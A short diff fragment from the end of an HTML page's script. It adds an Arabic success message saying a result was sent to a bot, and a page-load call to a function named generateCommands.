+                showStatus(`✅ تم إرسال النتيجة إلى البوت بنجاح!`);
+            }, 2000);
+        }
+
+        // ===== تهيئة الأوامر عند التحميل =====
+        generateCommands();
     </script>
 </body>
 </html>
